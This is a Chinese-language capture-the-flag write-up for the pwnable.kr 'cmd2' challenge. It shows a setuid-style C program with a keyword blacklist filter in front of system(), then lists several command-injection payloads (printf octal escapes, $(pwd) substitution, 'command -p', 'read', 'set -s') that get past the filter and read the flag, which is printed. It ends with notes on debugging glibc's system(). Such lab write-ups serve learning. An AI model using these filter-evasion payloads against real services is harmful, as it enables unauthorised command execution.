```
cmd2 - 9 pt

Daddy bought me a system command shell.
but he put some filters to prevent me from playing with it without his permission...
but I wanna play anytime I want!

ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)
```

下载程序，`scp -P 2222 -p  cmd2@pwnable.kr:/home/cmd2/* ./`  password：mommy now I get what PATH environment is for :)

源码如下：

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	system( argv[1] );
	return 0;
}
```

cmd2是cmd1的加强版，清空了环境变量。不允许出现 = PATH export / ` flag。

由于限制了`/`,导致cmd1中的bypass方案几乎都失效了，因为没有/的情况下，当前目录没有写权限，不能调用别的命令了。system本质是调用execve /bin/sh 来执行命令的（见文末system源码调试）。所以要想方法借助sh的特性来出现/。

最终我发现了在sh有的命令是调用/bin /usr/bin目录下的文件来执行的，还存在一些命令是sh内置的命令。如sh中的echo和/bin/echo是两种文件，而且在不同的shell中实现的也不愿意。以zsh为例。

```
➜  ~ which echo
echo: shell built-in command
➜  ~ which /bin/echo
/bin/echo
```

这里介绍了csh和sh中的shell builtin command https://www.gsp.com/cgi-bin/man.cgi?section=1&topic=builtin

综上，借助sh的shell builtin command来读flag。

## flag

```bash
# sh在没有环境变量时，也可以执行command命令
cmd2@ubuntu:~$ ./cmd2 "command -p cat f\lag"
command -p cat f\lag
FuN_w1th_5h3ll_v4riabl3s_haha

# read 读取环境并执行
cmd2@ubuntu:~$ ./cmd2 "read a;\$a"
read a;$a
/bin/cat flag
FuN_w1th_5h3ll_v4riabl3s_haha

# set -s
cmd2@ubuntu:~$ /home/cmd2/cmd2 'set -s'
set -s
/bin/cat flag
FuN_w1th_5h3ll_v4riabl3s_haha


# 根目录运行pwd得到 / ，用来替代/  ,cmd1中的姿势都可以用了XD
cmd2@ubuntu:/$ /home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla\g'
$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla\g
FuN_w1th_5h3ll_v4riabl3s_haha
```

看网上某些wp，printf echo pwd这些命令不是builtin command（例如，printf在sh中是在/usr/bin/printf目录下的），但是也可以运行，awesome！

不是builtin command，没有path的情况下，为什么可以索引到呢？以后遇到了再研究吧。

```bash
# printf  八进制数构造/bin/cat flag 
cmd2@ubuntu:~$ ./cmd2 '$(printf "\57\142\151\156\57\143\141\164\40\146\154\141\147")'
$(printf "\57\142\151\156\57\143\141\164\40\146\154\141\147")
FuN_w1th_5h3ll_v4riabl3s_haha

# sh中 echo '\57' 就是 /   '$()'会传递给程序， "$()"会直接解析再传递
cmd2@ubuntu:~$ sh
$ echo '\57'
/
cmd2@ubuntu:~$ ./cmd2 '$(echo "\57bin\57cat fla*")'
$(echo "\57bin\57cat fla*")
FuN_w1th_5h3ll_v4riabl3s_haha
```



## 参考

1. command https://medium.com/@clong/pwnable-kr-cmd1-cmd2-writeups-e6980fa8daca
2. set -s https://gist.github.com/dual5651/910a89eabcb471ab3a314ed52a82a5c7
3. set的更多参数用法 http://www.ruanyifeng.com/blog/2017/11/bash-set.html
4. read http://www.ktstartblog.top/index.php/archives/132/
5. pwd https://www.cnblogs.com/p4nda/p/7147552.html
6. printf https://medium.com/@c0ngwang/pwnable-kr-writeup-cmd2-a40142d43498
7. echo http://xhyumiracle.com/pwnablr-kr-cmd2/





## 补充：system调用sh执行命令源码

下载glibc后，开始调试system源码。

```bash
# 编译
gcc system.c -g -o system
# 调试
gdb system
# 加载源码
gdb> directory /root/Pwn/glibc/glibc-2.23/sysdeps/posix/
```

system调用链：`__libc_system`->do_system->`__execve (SHELL_PATH, (char *const *) new_argv, __environ)` 。SHELL_PATH是/bin/sh。

do_system 部分源码：

```c
// ... 处理一些信号 
if (pid == (pid_t) 0)
    {
      /* Child side.  */
      const char *new_argv[4];
      new_argv[0] = SHELL_NAME;
      new_argv[1] = "-c";
      new_argv[2] = line;
      new_argv[3] = NULL;

      /* Restore the signals.  */
      (void) __sigaction (SIGINT, &intr, (struct sigaction *) NULL);
      (void) __sigaction (SIGQUIT, &quit, (struct sigaction *) NULL);
      (void) __sigprocmask (SIG_SETMASK, &omask, (sigset_t *) NULL);
      INIT_LOCK ();

      /* Exec the shell.  */
      (void) __execve (SHELL_PATH, (char *const *) new_argv, __environ);
      _exit (127);
    }
```

详细参考：关于glibc的system函数调用实现https://blog.csdn.net/u010039418/article/details/77017689